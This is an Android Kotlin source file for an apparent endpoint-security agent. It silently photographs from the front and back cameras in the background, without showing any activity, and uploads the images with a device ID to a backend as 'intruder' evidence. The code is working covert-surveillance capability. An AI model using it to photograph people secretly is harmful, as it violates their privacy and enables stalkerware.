package com.edr.agent.camera

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Autonomous Background Camera Capturer (Zero-Activity / Non-Blocking).
 *
 * Captures photos directly from Front and Back cameras via Camera2 API from
 * the background service without launching any Activity, avoiding Android 10-16+
 * Background Activity Launch (BAL) restrictions.
 */
object SilentCameraCapturer {
    private const val TAG = "SilentCameraCapturer"
    private val isBusy = AtomicBoolean(false)

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    fun capture(context: Context, triggerReason: String = "Manual Admin Request") {
        if (!isBusy.compareAndSet(false, true)) {
            Log.w(TAG, "Camera capture is already in progress. Ignoring duplicate request.")
            return
        }

        Thread {
            try {
                performCapture(context, triggerReason)
            } catch (e: Exception) {
                Log.e(TAG, "Unhandled error during silent camera capture: ${e.message}", e)
            } finally {
                isBusy.set(false)
            }
        }.start()
    }

    private fun performCapture(context: Context, triggerReason: String) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "CAMERA permission not granted. Cannot capture intruder photo.")
            EdrLocalStorage.appendEdrLog(context, "CAMERA_ERR", "Capture aborted: CAMERA permission missing")
            return
        }

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager
        if (cameraManager == null) {
            Log.e(TAG, "CameraManager service unavailable.")
            return
        }

        var frontCameraId: String? = null
        var backCameraId: String? = null

        try {
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == CameraCharacteristics.LENS_FACING_FRONT && frontCameraId == null) {
                    frontCameraId = id
                } else if (facing == CameraCharacteristics.LENS_FACING_BACK && backCameraId == null) {
                    backCameraId = id
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error enumerating camera IDs: ${e.message}")
        }

        Log.i(TAG, "Capturing silent cameras. Front: $frontCameraId, Back: $backCameraId")

        val handlerThread = HandlerThread("EDR_CameraWorker").apply { start() }
        val handler = Handler(handlerThread.looper)

        var frontPhotoBytes: ByteArray? = null
        var backPhotoBytes: ByteArray? = null

        // 1. Capture Front Camera (Intruder Face)
        if (frontCameraId != null) {
            frontPhotoBytes = snapSingleCamera(cameraManager, frontCameraId, handler)
            Log.i(TAG, "Front camera capture complete: ${frontPhotoBytes?.size ?: 0} bytes")
        }

        // Brief cooldown between hardware camera switches
        try { Thread.sleep(350) } catch (ignored: Exception) {}

        // 2. Capture Back Camera (Environment / Room)
        if (backCameraId != null) {
            backPhotoBytes = snapSingleCamera(cameraManager, backCameraId, handler)
            Log.i(TAG, "Back camera capture complete: ${backPhotoBytes?.size ?: 0} bytes")
        }

        // Stop worker thread
        handlerThread.quitSafely()

        if (frontPhotoBytes == null && backPhotoBytes == null) {
            Log.w(TAG, "No photo bytes captured from either camera.")
            return
        }

        // 3. Upload evidence directly to EDR Backend
        try {
            val deviceId = SyncPreferences.deviceId
            val payload = mutableMapOf<String, Any>(
                "deviceId" to deviceId,
                "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
                "triggerReason" to triggerReason
            )

            if (frontPhotoBytes != null) {
                payload["frontPhotoBase64"] = Base64.encodeToString(frontPhotoBytes, Base64.NO_WRAP)
            }
            if (backPhotoBytes != null) {
                payload["backPhotoBase64"] = Base64.encodeToString(backPhotoBytes, Base64.NO_WRAP)
            }

            val uploadUrl = "${SyncPreferences.httpBaseUrl}/api/devices/$deviceId/photos"
            Log.i(TAG, "Uploading intruder photo evidence to $uploadUrl...")

            val request = Request.Builder()
                .url(uploadUrl)
                .post(gson.toJson(payload).toRequestBody(jsonMediaType))
                .build()

            val response = httpClient.newCall(request).execute()
            val code = response.code
            response.close()

            if (response.isSuccessful) {
                Log.i(TAG, "Intruder photos uploaded successfully! HTTP $code")
                EdrLocalStorage.appendEdrLog(
                    context,
                    "EVIDENCE",
                    "Captured & uploaded intruder photos ($triggerReason). Front: ${frontPhotoBytes != null}, Back: ${backPhotoBytes != null}"
                )
            } else {
                Log.e(TAG, "Server rejected intruder photo upload: HTTP $code")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed uploading intruder photo: ${e.message}", e)
        }
    }

    @SuppressLint("MissingPermission")
    private fun snapSingleCamera(
        cameraManager: CameraManager,
        cameraId: String,
        handler: Handler
    ): ByteArray? {
        val latch = CountDownLatch(1)
        var capturedBytes: ByteArray? = null
        var cameraDevice: CameraDevice? = null
        var captureSession: CameraCaptureSession? = null
        var imageReader: ImageReader? = null

        try {
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
            val targetSize = sizes?.filter { it.width in 800..1920 }?.maxByOrNull { it.width * it.height }
                ?: sizes?.firstOrNull()

            val width = targetSize?.width ?: 1280
            val height = targetSize?.height ?: 720

            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        capturedBytes = bytes
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error acquiring image buffer: ${e.message}")
                } finally {
                    latch.countDown()
                }
            }, handler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = imageReader.surface
                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(surface)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        }

                        @Suppress("DEPRECATION")
                        camera.createCaptureSession(
                            listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
                                    try {
                                        session.capture(captureBuilder.build(), null, handler)
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Capture failed on camera $cameraId: ${e.message}")
                                        latch.countDown()
                                    }
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    Log.e(TAG, "CaptureSession configure failed on camera $cameraId")
                                    latch.countDown()
                                }
                            },
                            handler
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Error creating capture session: ${e.message}")
                        latch.countDown()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    latch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera $cameraId error: $error")
                    latch.countDown()
                }
            }, handler)

            // Wait up to 5 seconds per camera
            latch.await(5000, TimeUnit.MILLISECONDS)
        } catch (e: Exception) {
            Log.e(TAG, "Exception snapping camera $cameraId: ${e.message}")
        } finally {
            try {
                captureSession?.close()
            } catch (ignored: Exception) {}
            try {
                cameraDevice?.close()
            } catch (ignored: Exception) {}
            try {
                imageReader?.close()
            } catch (ignored: Exception) {}
        }

        return capturedBytes
    }
}

